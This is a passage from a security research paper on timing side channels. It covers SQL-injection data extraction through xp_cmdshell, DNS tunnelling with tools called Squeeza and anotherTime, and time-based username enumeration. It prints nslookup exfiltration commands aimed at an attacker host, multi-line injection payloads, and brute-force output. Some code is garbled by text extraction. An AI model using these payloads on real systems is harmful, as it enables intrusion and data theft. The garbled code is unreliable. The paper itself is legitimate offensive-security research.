caused the application to sleep two seconds for every
1-bit in the bitstream (with a zero obviously sleeping
no seconds). This eﬀectively addressed both problems
raised earlier.
The same command which previously
ran for 8 minutes took 50 seconds and the new system
was more tolerant of latency issues.
For example, if
latency issues began to surface as a result of network
congestion or simply because the webserver was busy,
the second argument to the script could be altered to
a higher value, say 60 seconds. Then every 1-bit in the
bitstream would cause the application to sleep 1 minute,
while every 0-bit would cause the script to not sleep at
all. The script regarded any amount of time above 50%
of the timing factor to be a 1, meaning that latency or
line noise in the 60-second time factor requires the re-
sponse of a 0-bit to be delayed by at least 30 seconds to
actually aﬀect the results. We did not seek to optimise
these values; we wish to merely demonstrate the ease
with which they can be tuned.
4
The use of timing with SQL In-
jection attacks.
The explanation of SQL Injection as an attack vector is
widely documented. A brief (selective) history as it per-
tains to our current topic however will be discussed. In
the early days of these attacks it was almost easier to lo-
cate a site vulnerable to SQL Injection attacks than not.
It was also fairly commonplace that the compromised
SQL Server resided behind liberal ﬁrewalls, allowing the
attacker to connect home from the compromised SQL
Server in order to establish a useful working channel.
As ﬁrewall administrators started to come to grips
with data driven applications and their security archi-
tectures, attackers began to ﬁnd that the easy reverse
TCP connections that were the basis of many reverse
shells were increasingly disallowed. (Clearly the infras-
tructure ﬁrewall engineers were ahead of web applica-
tion developers in this regard.) This left attackers with
two obvious choices:
1. Find an outbound UDP Channel outbound to de-
termine whether code execution was successful.
2. Make use of timing to determine if code execution
was successful.
An outbound UDP channel to simply determine if code
was executing was provided standard on most Microsoft
OS installations by means of the ubiquitous nslookup
command. If an attacker believed he was executing code
through a SQL Injection string, he could simply craft
his attack input to contain the following snippet of SQL:
exec master..xp cmdshell(‘nslookup moooooo
attacker ip’)
The attacker would then monitor incoming DNS re-
quests to his machine (perhaps with the use of a tool
such as netcat) and if a request was seen for ‘moooooo’
would therefore know that execution of commands on
the remote SQL Server was occurring. When arbitrary
outbound UDP was also blocked (pesky ﬁrewall admin-
istrators), the attacker simply modiﬁed his string as
follows:
exec master..xp cmdshell(‘nslookup moo
moo moo.sensepost.com’)
This way, even if the SQL Server itself was unable to
make outbound DNS requests directly, its request would
traverse a DNS resolver chain, and eventually some
DNS server would make a request for ‘moo moo moo-
.sensepost.com’ to the sensepost.com DNS server. Once
the attacker submits his injection string he merely sniﬀs
traﬃc to his own DNS Server to watch for the incoming
request which again conﬁrms that he is indeed execut-
ing through xp cmdshell. This process is illustrated in
Figure 11.
A few years ago, one of the authors posted to public
mailing lists on the opportunity to obtain more infor-
mation than a simple conﬁrmation of execution through
what was dubbed “a poor mans DNS tunnel”.
This
simple cmd.exe for-loop technique made use of a SQL
Injection string that ran a command on the remote
server, broker the result up into words based on the
spaces in the output and submitted an nslookup re-
quest with each word as a sub-domain in the request.
This piped all printable character responses to the at-
tacker via DNS who could then view this data as before,
by sniﬃng the traﬃc to his own DNS server.
The second technique mentioned was to make use
of timing to determine if commands had executed on
the server. Much like in the earlier CGI example, we
were able to use a simple command with run-times of
our choosing to determine if commands were executing
on the server.
exec master..xp cmdshell(‘ping -c20
localhost’)
Similarly, timing the amount of time taken before the
application returned allowed us to determine if the com-
mand ultimately succeeded.
Using timing to extract
Boolean data in SQL Injection has been discussed prior
to this paper [14]. A simple example would be
if table exists sleep(10), else sleep 0.
The “poor mans DNS Tunnel” worked acceptably for
simple commands like directory listings but prevented
almost any serious reliable communications. To date
several automatic SQL injection frameworks will hap-
pily handle extracting data from the SQL Server where
outbound TCP connections from the SQL Server are
6
Figure 11: DNS request traversing the look-up chain
allowed [15] and a few will extract data with web ap-
plication error messages [16, 17] but none have made
eﬃcient use of DNS as a channel. While some tools do
oﬀer a DNS Tunnel within their framework these tun-
nels work by ﬁrst uploading a binary to the machine
which then acts as a DNS redirector for executed com-
mand output [18].
To this end SensePost wrote a tool called Squeeza
which was aimed at making SQL Injection DNS tun-
neling more robust and essentially more usable. At its
core, Squeeza simply does the following:
1. Through the SQL Injection entry point, execute
a command or obtain DB information
2. Populate a temporary table within the DB with
the results from previous step
3. Encode all of the data within the table to be DNS-
safe by using hex encoding.
4. Loop through the hex encoded data breaking it up
into equal-sized chunks, and issue DNS requests
to the target DNS server for {random}.hex.hex-
.hex. . . sensepost.com
5. Sniﬀs the traﬃc on the DNS Server, decodes it
and displays it to the user in the form of an inter-
active shell.
Steps 1 to 4 are delivered as the payload of our injec-
tion string and translates to the SQL snippet shown in
Figure 12. 3
Squeeza has several settable parameters allowing us
to tailor the rate at which we would like to receive the
data, but its encoding system ensures that the responses
are 7-bit ASCII clean.
This means that this system
can fairly easily be extended to include the transfer of
arbitrary binary ﬁles from the target system.
Combining the simple Boolean timing trick, the tim-
ing tool shown in the Section 3 and Squeeza is an ob-
vious progression and resulted in a python script called
anotherTime.py.
The snippet in Figure 13 is taken from the original
anotherTime README.txt and should best serve as
an explanation. Once more, the actual SQL payload
delivered is relatively simple, and is given in Figure 14. 4
In Figure 14, (a) performs routine housekeeping,
populating the cmd table with appropriate data (in this
example, the output of our xp cmdshell command.)
The SQL in part (b) creates a second table (cmd2) and
populates it with the binary representation of the cmd
table. The tool then makes individual requests using
the SQL in (c). It holds three variables: the current
line being processed, the current bit being read from
3Certain aspects of the SQL snippet are not discussed further,
but observe that a random number is prepended to each request,
to avoid caching issues. Also note that the formatting of the snip-
pet is for readability purposes only; the SQL in, in fact, delivered
as a single line of text.
4Again, note that the command has been formatted here for
easy reading and is actually delivered as a single line of text.
7
declare @r as sysname,@l as sysname,@b as int, @d as int,@c as int,@a as varchar(600);
select @d=count(num)from temp table;
set @b=STARTLINE;
while @b hostname
intranet
.-----------------------------------------------------------------.
Figure 13: anotherTime README.txt
8
(a)
drop table cmd;
create table cmd(data varchar(4096), num int identity(1,1));
INSERT into cmd EXEC master..xp cmdshell ’" + cmd + "’;
insert into cmd values(‘theend’).
(b)
drop table cmd2;
create table cmd2(data varchar(8000), num int identity(1,1));
declare @a as varchar(600),@b as int;
set @b=1;
select @a=data from cmd where num=1;
while charindex(‘theend’,@a) = 0 or charindex(‘theend’,@a) is null begin
set @b=@b+1;
declare @c as int, @d as varchar(8000);
set @c=1;
set @d=‘’;
while @c  0.5)
{
Start timer
Login to site(.no such user.)
Stop timer
If(Stop timer .
Start timer) > 0.5 // looks like line noise
{ re test(Username) }
else
{ print (Username is Valid) }
}
Figure 17: Time-based username brute-force logic
wh00t: /customers/bh haroon$ python t-login.py names list.txt
=================================
XXXXXX web login - timing check
PI:EMAIL
=================================
[*] Trying username BOB 0.0 seconds..
[*] Trying username TOM 0.0 seconds..
[*] Trying username PETER 0.0 seconds..
[*] Trying username MARCO 1.0 seconds..
Valid User!
[*] Trying username BRADLEY 0.0 seconds..
[*] Trying username HAROON 0.0 seconds..
[*] Trying username CHARL 0.0 seconds..
[*] Trying username SENSEPOST 0.0 seconds..